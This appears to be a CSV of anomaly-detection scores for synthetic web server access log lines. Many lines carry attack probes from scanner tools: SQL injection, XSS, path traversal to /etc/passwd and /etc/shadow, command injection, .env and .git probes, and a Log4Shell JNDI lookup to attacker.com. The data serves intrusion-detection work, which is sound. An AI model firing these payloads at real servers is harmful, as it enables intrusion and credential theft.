score_content,score_session,score_fused,score_fused_norm,line
1.989214301109314,,1.989214301109314,1.989214301109314,215.182.178.232 - - [10/Jan/2025:12:04:09 +0100] "GET /logout HTTP/1.1" 200 5846 "https://www.google.com/" "sqlmap/1.5.10#stable"
11036.6220703125,,11036.6220703125,11036.6220703125,33.113.67.95 - - [10/Jan/2025:12:04:10 +0100] "GET /wp-login.php HTTP/1.1" 503 1176 "https://www.google.com/" "curl/7.68.0"
11038.046875,,11038.046875,11038.046875,96.115.139.250 - - [10/Jan/2025:12:04:14 +0100] "GET /dashboard HTTP/1.1" 500 302 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.066375732421875,,2.066375732421875,2.066375732421875,197.38.243.118 - - [10/Jan/2025:12:04:16 +0100] "GET /admin HTTP/1.1" 200 16464 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.8947373628616333,,1.8947373628616333,1.8947373628616333,122.230.75.249 - - [10/Jan/2025:12:04:16 +0100] "GET /dashboard HTTP/1.1" 204 9784 "https://www.google.com/" "python-requests/2.31.0"
24.003612518310547,,24.003612518310547,24.003612518310547,188.123.231.11 - - [10/Jan/2025:12:04:20 +0100] "GET /search?q=camera HTTP/1.1" 200 3780 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5770400762557983,,0.5770400762557983,0.5770400762557983,115.92.24.84 - - [10/Jan/2025:12:04:20 +0100] "GET /.env HTTP/1.1" 201 7320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.55010986328125,,26.55010986328125,26.55010986328125,51.6.22.138 - - [10/Jan/2025:12:04:25 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 9207 "-" "nikto/2.5.0"
24.27564239501953,,24.27564239501953,24.27564239501953,131.242.15.233 - - [10/Jan/2025:12:04:29 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 19927 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.060840606689453,,24.060840606689453,24.060840606689453,4.73.89.90 - - [10/Jan/2025:12:04:30 +0100] "GET /search?q=phone HTTP/1.1" 200 12316 "https://news.ycombinator.com/" "curl/7.68.0"
2.868002414703369,,2.868002414703369,2.868002414703369,206.114.74.42 - - [10/Jan/2025:12:04:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 302 13718 "https://news.ycombinator.com/" "dirb/2.22"
2.0446932315826416,,2.0446932315826416,2.0446932315826416,122.254.223.135 - - [10/Jan/2025:12:04:35 +0100] "GET /about HTTP/1.1" 200 10036 "-" "curl/7.68.0"
2.040905714035034,,2.040905714035034,2.040905714035034,107.45.143.119 - - [10/Jan/2025:12:04:39 +0100] "GET /about HTTP/1.1" 200 9056 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.610641598701477,,0.610641598701477,0.610641598701477,11.211.212.78 - - [10/Jan/2025:12:04:40 +0100] "GET /.env HTTP/1.1" 200 16175 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.08552360534668,,24.08552360534668,24.08552360534668,40.68.77.245 - - [10/Jan/2025:12:04:44 +0100] "GET /api/product?id=123 HTTP/1.1" 200 180 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.07036781311035,,24.07036781311035,24.07036781311035,233.177.166.63 - - [10/Jan/2025:12:04:44 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 16218 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.877211332321167,,1.877211332321167,1.877211332321167,149.124.145.112 - - [10/Jan/2025:12:04:46 +0100] "GET /phpmyadmin HTTP/1.1" 200 11954 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.998732328414917,,1.998732328414917,1.998732328414917,5.217.67.42 - - [10/Jan/2025:12:04:51 +0100] "GET /profile HTTP/1.1" 200 18950 "-" "python-requests/2.31.0"
0.18877674639225006,,0.18877674639225006,0.18877674639225006,70.93.108.163 - - [10/Jan/2025:12:04:52 +0100] "GET /../../etc/passwd HTTP/1.1" 200 1833 "-" "sqlmap/1.5.10#stable"
1.854132056236267,,1.854132056236267,1.854132056236267,196.25.154.193 - - [10/Jan/2025:12:04:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 6104 "https://twitter.com/" "curl/7.68.0"
2.0135278701782227,,2.0135278701782227,2.0135278701782227,25.137.149.91 - - [10/Jan/2025:12:04:56 +0100] "GET /logout HTTP/1.1" 200 11979 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.634763717651367,,26.634763717651367,26.634763717651367,88.236.234.42 - - [10/Jan/2025:12:04:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 13600 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.56597137451172,,26.56597137451172,26.56597137451172,158.177.213.244 - - [10/Jan/2025:12:04:58 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 304 18406 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.82421875,,30125.82421875,30125.82421875,123.90.80.177 - - [10/Jan/2025:12:05:01 +0100] "GET /contact HTTP/1.1" 400 35 "https://www.google.com/" "curl/7.68.0"
1.9019076824188232,,1.9019076824188232,1.9019076824188232,8.191.209.31 - - [10/Jan/2025:12:05:04 +0100] "GET /dashboard HTTP/1.1" 200 10083 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.884275436401367,,23.884275436401367,23.884275436401367,34.252.21.109 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.02623176574707,,24.02623176574707,24.02623176574707,9.204.169.132 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=phone HTTP/1.1" 200 3632 "-" "python-requests/2.31.0"
24.209936141967773,,24.209936141967773,24.209936141967773,171.3.194.25 - - [10/Jan/2025:12:05:12 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9984 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.888456344604492,,23.888456344604492,23.888456344604492,8.24.38.217 - - [10/Jan/2025:12:05:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11619 "https://twitter.com/" "python-requests/2.31.0"
23.86616325378418,,23.86616325378418,23.86616325378418,26.210.149.196 - - [10/Jan/2025:12:05:15 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2339 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.031761407852173,,2.031761407852173,2.031761407852173,2.250.186.26 - - [10/Jan/2025:12:05:16 +0100] "GET /logout HTTP/1.1" 200 17700 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.09940958768129349,,0.09940958768129349,0.09940958768129349,47.214.91.252 - - [10/Jan/2025:12:05:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3616 "https://news.ycombinator.com/" "dirb/2.22"
1.7870429754257202,,1.7870429754257202,1.7870429754257202,32.120.29.134 - - [10/Jan/2025:12:05:22 +0100] "GET /server-status HTTP/1.1" 200 10398 "https://news.ycombinator.com/" "curl/7.68.0"
0.3959522545337677,,0.3959522545337677,0.3959522545337677,30.99.73.117 - - [10/Jan/2025:12:05:24 +0100] "GET /index.html HTTP/1.1" 200 16277 "https://example.com/" "python-requests/2.31.0"
24.041467666625977,,24.041467666625977,24.041467666625977,75.253.219.110 - - [10/Jan/2025:12:05:29 +0100] "GET /search?q=camera HTTP/1.1" 200 13445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9907654523849487,,1.9907654523849487,1.9907654523849487,173.27.102.113 - - [10/Jan/2025:12:05:32 +0100] "GET /profile HTTP/1.1" 200 16210 "-" "python-requests/2.31.0"
3.176844835281372,,3.176844835281372,3.176844835281372,190.237.229.251 - - [10/Jan/2025:12:05:32 +0100] "GET /.env HTTP/1.1" 301 3433 "-" "curl/7.68.0"
1.9135277271270752,,1.9135277271270752,1.9135277271270752,32.60.215.109 - - [10/Jan/2025:12:05:34 +0100] "GET /dashboard HTTP/1.1" 200 13347 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.683204174041748,,4.683204174041748,4.683204174041748,92.122.171.155 - - [10/Jan/2025:12:05:36 +0100] "GET /login HTTP/1.1" 302 13214 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.21349646151065826,,0.21349646151065826,0.21349646151065826,126.128.60.161 - - [10/Jan/2025:12:05:40 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 8314 "-" "curl/7.68.0"
2.018752098083496,,2.018752098083496,2.018752098083496,249.46.98.155 - - [10/Jan/2025:12:05:40 +0100] "GET /about HTTP/1.1" 200 976 "https://example.com/" "sqlmap/1.5.10#stable"
3.0030219554901123,,3.0030219554901123,3.0030219554901123,197.127.203.120 - - [10/Jan/2025:12:05:41 +0100] "GET /.git/config HTTP/1.1" 302 17137 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.235658645629883,,24.235658645629883,24.235658645629883,140.5.244.196 - - [10/Jan/2025:12:05:46 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17812 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.423828125,,30147.423828125,30147.423828125,118.10.9.46 - - [10/Jan/2025:12:05:46 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 906 "https://www.google.com/" "python-requests/2.31.0"
26.681413650512695,,26.681413650512695,26.681413650512695,196.29.146.173 - - [10/Jan/2025:12:05:49 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 16072 "https://twitter.com/" "nikto/2.5.0"
24.224504470825195,,24.224504470825195,24.224504470825195,130.15.101.68 - - [10/Jan/2025:12:05:54 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5221 "https://twitter.com/" "nikto/2.5.0"
26.620502471923828,,26.620502471923828,26.620502471923828,83.16.8.152 - - [10/Jan/2025:12:05:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.676568984985352,,4.676568984985352,4.676568984985352,98.25.110.89 - - [10/Jan/2025:12:05:59 +0100] "GET /admin HTTP/1.1" 302 11282 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
23.897558212280273,,23.897558212280273,23.897558212280273,152.22.234.177 - - [10/Jan/2025:12:06:01 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10326 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0149803161621094,,2.0149803161621094,2.0149803161621094,118.169.222.109 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 200 1324 "https://example.com/" "dirb/2.22"
11038.2880859375,,11038.2880859375,11038.2880859375,147.100.83.147 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 502 773 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.90454864501953,,23.90454864501953,23.90454864501953,208.196.171.87 - - [10/Jan/2025:12:06:01 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 16574 "https://twitter.com/" "curl/7.68.0"
1.7552279233932495,,1.7552279233932495,1.7552279233932495,216.218.138.55 - - [10/Jan/2025:12:06:03 +0100] "GET /server-status HTTP/1.1" 200 2568 "https://example.com/" "python-requests/2.31.0"
3.2359726428985596,,3.2359726428985596,3.2359726428985596,184.217.149.25 - - [10/Jan/2025:12:06:03 +0100] "GET /.env HTTP/1.1" 304 3113 "https://example.com/" "sqlmap/1.5.10#stable"
24.249536514282227,,24.249536514282227,24.249536514282227,204.20.167.211 - - [10/Jan/2025:12:06:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 11480 "https://twitter.com/" "python-requests/2.31.0"
24.052385330200195,,24.052385330200195,24.052385330200195,65.160.132.117 - - [10/Jan/2025:12:06:05 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13282 "-" "curl/7.68.0"
0.27799102663993835,,0.27799102663993835,0.27799102663993835,170.247.211.191 - - [10/Jan/2025:12:06:10 +0100] "GET /assets/app.js HTTP/1.1" 200 7078 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30125.591796875,,30125.591796875,30125.591796875,161.16.134.52 - - [10/Jan/2025:12:06:15 +0100] "GET /server-status HTTP/1.1" 404 1488 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30147.404296875,,30147.404296875,30147.404296875,82.221.213.234 - - [10/Jan/2025:12:06:16 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 400 840 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.037233352661133,,24.037233352661133,24.037233352661133,176.154.61.104 - - [10/Jan/2025:12:06:19 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 204 8503 "-" "Wget/1.20.3 (linux-gnu)"
26.553977966308594,,26.553977966308594,26.553977966308594,119.125.144.254 - - [10/Jan/2025:12:06:20 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 10275 "https://news.ycombinator.com/" "dirb/2.22"
1.8661315441131592,,1.8661315441131592,1.8661315441131592,8.67.203.206 - - [10/Jan/2025:12:06:25 +0100] "GET /api/products HTTP/1.1" 200 4570 "https://twitter.com/" "curl/7.68.0"
11036.435546875,,11036.435546875,11036.435546875,201.6.15.221 - - [10/Jan/2025:12:06:26 +0100] "GET /wp-login.php HTTP/1.1" 500 995 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.650390625,,30125.650390625,30125.650390625,230.94.172.169 - - [10/Jan/2025:12:06:30 +0100] "GET /phpmyadmin HTTP/1.1" 403 833 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.071195602416992,,24.071195602416992,24.071195602416992,239.31.134.171 - - [10/Jan/2025:12:06:35 +0100] "GET /api/product?id=123 HTTP/1.1" 200 16492 "https://twitter.com/" "python-requests/2.31.0"
1.8454378843307495,,1.8454378843307495,1.8454378843307495,198.207.81.85 - - [10/Jan/2025:12:06:37 +0100] "GET /phpmyadmin HTTP/1.1" 200 4106 "https://www.google.com/" "dirb/2.22"
0.3411320149898529,,0.3411320149898529,0.3411320149898529,113.105.66.221 - - [10/Jan/2025:12:06:40 +0100] "GET /.git/config HTTP/1.1" 200 9096 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3587662875652313,,0.3587662875652313,0.3587662875652313,122.175.64.247 - - [10/Jan/2025:12:06:44 +0100] "GET /.git/config HTTP/1.1" 200 13986 "https://www.google.com/" "python-requests/2.31.0"
30147.4921875,,30147.4921875,30147.4921875,166.248.232.156 - - [10/Jan/2025:12:06:46 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 400 43 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.059112548828125,,24.059112548828125,24.059112548828125,80.164.246.180 - - [10/Jan/2025:12:06:51 +0100] "GET /api/product?id=123 HTTP/1.1" 200 12705 "-" "curl/7.68.0"
24.039897918701172,,24.039897918701172,24.039897918701172,238.251.235.66 - - [10/Jan/2025:12:06:55 +0100] "GET /search?q=camera HTTP/1.1" 200 12977 "-" "curl/7.68.0"
30124.04296875,,30124.04296875,30124.04296875,82.226.208.197 - - [10/Jan/2025:12:06:56 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 404 1293 "-" "dirb/2.22"
23.966100692749023,,23.966100692749023,23.966100692749023,238.216.86.184 - - [10/Jan/2025:12:06:58 +0100] "GET /search?q=headphones HTTP/1.1" 200 13631 "-" "Wget/1.20.3 (linux-gnu)"
1.9015206098556519,,1.9015206098556519,1.9015206098556519,187.209.141.189 - - [10/Jan/2025:12:06:59 +0100] "GET /phpmyadmin HTTP/1.1" 200 19830 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.2986505329608917,,0.2986505329608917,0.2986505329608917,162.114.203.165 - - [10/Jan/2025:12:07:04 +0100] "GET /wp-login.php HTTP/1.1" 201 6120 "-" "curl/7.68.0"
24.02025604248047,,24.02025604248047,24.02025604248047,29.41.64.133 - - [10/Jan/2025:12:07:07 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2794 "https://twitter.com/" "curl/7.68.0"
24.01806640625,,24.01806640625,24.01806640625,67.45.176.152 - - [10/Jan/2025:12:07:12 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4474 "https://example.com/" "sqlmap/1.5.10#stable"
23.975969314575195,,23.975969314575195,23.975969314575195,242.214.227.147 - - [10/Jan/2025:12:07:13 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 12464 "-" "Wget/1.20.3 (linux-gnu)"
30147.51953125,,30147.51953125,30147.51953125,51.68.180.219 - - [10/Jan/2025:12:07:13 +0100] "GET /api/product?id=123 HTTP/1.1" 403 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.217805862426758,,24.217805862426758,24.217805862426758,44.243.146.31 - - [10/Jan/2025:12:07:16 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12156 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.369140625,,30147.369140625,30147.369140625,31.58.183.53 - - [10/Jan/2025:12:07:19 +0100] "GET /search?q=camera HTTP/1.1" 400 1012 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.016765594482422,,24.016765594482422,24.016765594482422,154.56.211.73 - - [10/Jan/2025:12:07:21 +0100] "GET /search?q=laptop HTTP/1.1" 200 6870 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.21497096121311188,,0.21497096121311188,0.21497096121311188,61.159.116.233 - - [10/Jan/2025:12:07:24 +0100] "GET /../../etc/passwd HTTP/1.1" 200 8678 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.2390127182006836,,0.2390127182006836,0.2390127182006836,35.224.83.250 - - [10/Jan/2025:12:07:28 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 15464 "https://www.google.com/" "dirb/2.22"
4.407723903656006,,4.407723903656006,4.407723903656006,19.25.143.16 - - [10/Jan/2025:12:07:33 +0100] "GET /server-status HTTP/1.1" 302 8496 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11060.037109375,,11060.037109375,11060.037109375,248.206.154.182 - - [10/Jan/2025:12:07:34 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 503 1373 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.6005262136459351,,0.6005262136459351,0.6005262136459351,172.95.34.248 - - [10/Jan/2025:12:07:36 +0100] "GET /.env HTTP/1.1" 200 13033 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30147.7421875,,30147.7421875,30147.7421875,34.23.82.182 - - [10/Jan/2025:12:07:37 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 958 "https://www.google.com/" "dirb/2.22"
11036.435546875,,11036.435546875,11036.435546875,224.250.214.72 - - [10/Jan/2025:12:07:39 +0100] "GET /wp-login.php HTTP/1.1" 500 1022 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
